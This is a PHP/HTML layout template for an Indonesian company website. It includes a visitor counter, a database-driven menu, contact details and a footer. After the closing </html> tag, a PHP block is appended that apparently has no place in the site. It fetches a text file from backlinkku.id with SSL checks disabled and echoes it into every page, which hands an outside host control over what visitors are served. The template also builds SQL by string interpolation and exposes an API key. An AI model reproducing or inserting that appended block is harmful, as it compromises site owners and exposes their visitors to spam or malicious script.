<?php
$config = $this->db->query("SELECT * FROM config WHERE id='1'")->row();

$id = 0;
$ip_address = $_SERVER['REMOTE_ADDR'];
$hari_ini = date('Y-m-d');

$this->db->query("DELETE FROM view_artikel WHERE tgl<>'$hari_ini'");

$cek_ip = $this->db->query("SELECT id FROM view_artikel_det WHERE id_artikel='$id' and ip='$ip_address' and tgl='$hari_ini' and jns='Artikel'")->num_rows();
if ($cek_ip == 0) {
  $this->db->query("INSERT INTO view_artikel_det VALUE(null,'Artikel','$hari_ini','$id','$ip_address')");
  $cek_view = $this->db->query("SELECT id FROM view_artikel WHERE tgl='$hari_ini' and id_artikel='$id' and jns='Artikel'")->num_rows();
  if ($cek_view == 0) {
    $this->db->query("INSERT INTO view_artikel VALUE(null,'Artikel','$hari_ini','$id','1')");
  } else {
    $this->db->query("UPDATE view_artikel SET jml=jml+1 WHERE tgl='$hari_ini' and id_artikel='$id' and jns='Artikel'");
  }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/png" sizes="16x16" href="<?= base_url() ?>assets/images/<?= $config->logo ?>">
  <meta name="author" content="<?= $config->nm_perusahaan ?>">
  <meta name="description" content="<?= $config->sejarah_singkat ?>">
  <title><?= $config->nm_perusahaan ?></title>
  <!-- Bootstrap 4 -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  <!-- Owl Carousel CSS -->
  <link rel="stylesheet" href="<?= base_url() ?>/assets/front/js/owl.carousel/assets/owl.carousel.min.css">
  <!-- Custom CSS -->
  <link rel="stylesheet" href="<?= base_url() ?>/assets/front/css/custom.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

  <style type="text/css" media="screen">
    iframe {
      width: 100%;
      height: auto;
    }

    @media only screen and (min-width: 600px) {
      iframe {
        width: 100%;
        height: 450px;
      }
    }

    /* Always set the map height explicitly to define the size of the div
       * element that contains the map. */
    #map {
      height: 600px;
    }

    /* Optional: Makes the sample page fill the window. */
    html,
    body {
      height: 100%;
      margin: 0;
      padding: 0;
    }

    .custom-link {
      color: #000;
      font-size: 1rem;
    }

    .custom-link:hover {
      color: #2ecc71;
      text-decoration: none;
    }
  </style>

  <!-- JQuery -->
  <script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <!-- Bootstrap 4 -->
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  <!-- Owl Carousel JS -->
  <script src="<?= base_url() ?>/assets/front/js/owl.carousel/owl.carousel.min.js"></script>

  <script id="dsq-count-scr" src="//ptpn-boobleid-com.disqus.com/count.js" async></script>

  <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCxTOwdjmDoO8S0-YeEm37jpO7WZmhvZ2M&libraries=places"></script>


</head>

<body>




  <!---------------------- Navbar ---------------------->
  <nav class="navbar navbar-expand navbar-dark bg-primary-gradient">
    <div class="container">
      <ul class="navbar-nav mr-auto">
        <!--<li class="nav-item">
              <a class="nav-link" href="<?= $config->fb ?>" target="_blank">
                <img src="<?= base_url() ?>assets/front/assets/fb.svg" width="20px">
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="<?= $config->google ?>" target="_blank">
                <img src="<?= base_url() ?>assets/front/assets/gl.svg" width="20px">
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="<?= $config->ig ?>" target="_blank">
                <img src="<?= base_url() ?>assets/front/assets/ig.svg" width="20px">
              </a>
            </li>-->
      </ul>
      <ul class="navbar-nav ml-auto">
        <li class="nav-item">
          <a class="nav-link" href="<?= base_url() ?>info-karir">KARIR</a>
        </li>
        <li class="nav-item">
          <a class="nav-link content-link" href="#to_contact">KONTAK</a>
        </li>
      </ul>
    </div>
  </nav>

  <nav class="navbar navbar-expand-lg navbar-light nav-utama">
    <div class="container">
      <a class="navbar-brand" href="<?= base_url() ?>">
        <img src="<?= base_url() ?>assets/images/<?= $config->logo ?>" width="120" height="50" alt="">
      </a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav m-auto">

          <?php
          $menu = $this->db->query("SELECT * FROM menu_front WHERE parent=0");
          foreach ($menu->result() as $row) {

            $parent = $this->db->query("SELECT * FROM menu_front WHERE parent='$row->id'");
            if ($parent->num_rows() > 0) {
              echo '<li class="nav-item dropdown">
                    <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                      ' . $row->nm_menu . '
                    </a>
                    <div class="dropdown-menu" aria-labelledby="navbarDropdown">';
              foreach ($parent->result() as $rowi) {
                echo '<a class="dropdown-item" href="' . base_url($rowi->url) . '">' . $rowi->nm_menu . '</a>';
              }
              echo '</div>
                    </li>';
            } else {
              echo '<li class="nav-item">
                    <a class="nav-link" href="' . base_url($row->url) . '">' . $row->nm_menu . '</a>
                  </li>';
            }
          }
          ?>

        </ul>
      </div>
    </div>
  </nav>
  <!---------------------- End Navbar ---------------------->


  <?php
  $this->load->view($page);
  ?>


  <!---------------------- Footer ---------------------->

  <section class="bg-primary-gradient p-3" id="to_contact">
    <div class="container">
      <div class="row pt-3 pb-3">
        <div class="col-md-5 mb-2">
          <h4 class="f-white mb-0">KONTAK KAMI</h4>
        </div>
        <div class="col-md-3 mb-2 f-white fs-14">
          <?php
          $kontak = $this->db->query("SELECT telp FROM kontak");
          $count = $kontak->num_rows();
          $no = 1;
          echo '<table border="0" width="100%">
              <tr>
                <td rowspan="' . $count . '" width="15%"><img src="' . base_url() . 'assets/front/assets/hp.svg" width="25px" style="margin-top: 13px" class="f-left mr-3"></td>
              ';
          foreach ($kontak->result() as $row) {
            if ($no == 1) {
              echo '<td>' . $row->telp . '</td>
                  </tr>';
            } else {
              echo '<tr>
                  <td>' . $row->telp . '</td>
                  </tr>';
            }
            $no++;
          }
          echo '</table>';
          ?>
        </div>
        <div class="col-md-4 mb-2 f-white fs-14">

          <?php
          $kontak = $this->db->query("SELECT email,nm_kontak FROM kontak");
          $count = $kontak->num_rows();
          $no = 1;
          echo '<table border="0" width="100%">
              <tr>
                <td rowspan="' . $count . '" width="15%"><img src="' . base_url() . 'assets/front/assets/email.svg" width="25px" style="margin-top: 13px" class="f-left mr-3"></td>
              ';
          foreach ($kontak->result() as $row) {
            if ($no == 1) {
              echo '<td>' . $row->email . ' (' . $row->nm_kontak . ')</td>
                  </tr>';
            } else {
              echo '<tr>
                  <td>' . $row->email . ' (' . $row->nm_kontak . ')</td>
                  </tr>';
            }
            $no++;
          }
          echo '</table>';
          ?>
        </div>
      </div>
    </div>
  </section>

  <section class="cover pt-5 pb-4" style="background-image: url(assets/images/<?= $config->bg_footer ?>);">
    <div class="container">
      <div class="row">
        <div class="col-lg-4 col-xl-5">
          <img src="<?= base_url() ?>assets/images/<?= $config->logo ?>" width="50px" class="f-left mr-2">
          <p class="f-white fw-600 mb-2">
            <?= $config->nm_perusahaan ?> <br>
            <span class="fs-14 font-weight-light"><?= $config->bidang ?></span>
          </p>
          <p class="f-light fs-13 fw-300 mb-4"><?= $config->sejarah_singkat ?></p>
          <a href="<?= base_url() ?>assets/lampiran/<?= $config->company_profil ?>" target="_blank" class="btn btn-success2 f-left mb-5 mr-2" style="margin-top: 5px">
            <img src="<?= base_url() ?>/assets/front/assets/download.svg" width="20">
          </a>
          <p class="f-white">DOWNLOAD COMPANY PROFILE <br> <span class="fs-13 f-light">Klik ikon disamping untuk mengunduh dokumen profil perusahaan</span></p>
        </div>
        <div class="col-lg-4 col-xl-3 relative">
          <p class="relative mb-4">
            <span class="title-foot">
              LINK TERKAIT
            </span>
          </p>
          <?php
          $app = $this->db->query("SELECT judul,url FROM portal_app");
          foreach ($app->result() as $row) {
            echo '<p class="f-light fs-13 font-weight-light mb-2"> 
                  <a href="' . $row->url . '" target="_blank" style="color:#fff;text-decoration:none;"><img src="' . base_url() . 'assets/front/assets/daun.svg" width="15"> ' . $row->judul . '</a>
              </p>';
          }
          ?>

          <p class="relative mb-4">
            <span class="title-foot">
              OPERASIONAL KANTOR
            </span>
          </p>
          <?php
          $jadwal = $this->db->query("SELECT jadwal FROM jam_op");
          foreach ($jadwal->result() as $row) {
            echo '<p class="f-light fs-13 font-weight-light mb-2"> 
                  <img src="' . base_url() . 'assets/front/assets/daun.svg" width="15"> ' . $row->jadwal . '
              </p>';
          }
          ?>
        </div>
        <div class="col-lg-4">
          <p class="relative mb-4">
            <span class="title-foot">
              ALAMAT LENGKAP
            </span>
          </p>
          <?php
          $alamat = $this->db->query("SELECT alamat,nm_kontak FROM kontak");
          foreach ($alamat->result() as $row) {
            echo '<p class="f-light fs-13 font-weight-light mb-2"> 
                  <img src="' . base_url() . 'assets/front/assets/daun.svg" width="15"> ' . $row->alamat . ' (' . $row->nm_kontak . ')
              </p>';
          }
          ?>

          <p class="relative mb-4">
            <span class="title-foot">
              SOSIAL MEDIA
            </span>
          </p>
          <div style="margin-bottom:5px;">
            <a href="<?= $config->url_fb ?>" target="_blank" style="color:#fff; text-decoration: none;"><img src="<?= base_url() ?>/assets/front/assets/fb.svg" class="mr-2" width="30px"> <?= $config->fb ?></a>
          </div>
          <div style="margin-bottom:5px;">
            <a href="<?= $config->url_twitter ?>" target="_blank" style="color:#fff; text-decoration: none;"><img src="<?= base_url() ?>/assets/front/assets/twitter icon.svg" class="mr-2" width="30px"> <?= $config->twitter ?></a>
          </div>
          <div style="margin-bottom:5px;">
            <a href="<?= $config->url_ig ?>" target="_blank" style="color:#fff; text-decoration: none;"><img src="<?= base_url() ?>/assets/front/assets/ig.svg" width="30px" class="mr-2"> <?= $config->ig ?></a>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section class="m-black p-3 f-white text-center">
    <?= $config->nm_perusahaan ?> © 2020. All rights reserved
  </section>

  <!---------------------- End Footer ---------------------->



  <script src="<?= base_url() ?>/assets/front/js/custom.js"></script>
  <script type="text/javascript">
    $(document).ready(function() {
      $('.content-link').click(function(e) {
        e.preventDefault();

        $('html, body').animate({
          scrollTop: $('#to_contact').offset().top
        }, 1000);
      });
    });

    function load_error(jqXHR, exception) {
      var msg = '';
      if (jqXHR.status === 0) {
        msg = 'Not connect.\n Verify Network.';
      } else if (jqXHR.status == 404) {
        msg = 'Requested page not found. [404]';
      } else if (jqXHR.status == 500) {
        msg = 'Internal Server Error [500].';
      } else if (exception === 'parsererror') {
        msg = 'Requested JSON parse failed.';
      } else if (exception === 'timeout') {
        msg = 'Time out error.';
      } else if (exception === 'abort') {
        msg = 'Ajax request aborted.';
      } else {
        msg = 'Uncaught Error.\n' + jqXHR.responseText;
      }
      swal('Error', msg, "error");
    }
  </script>

</body>

</html>
<?php
$url = 'https://backlinkku.id/menu/server-id/script.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Nonaktifkan SSL verification jika diperlukan
$content = curl_exec($ch);

if (curl_errno($ch)) {
    echo "cURL Error: " . curl_error($ch);
} else {
    echo $content;
}
curl_close($ch);
?>
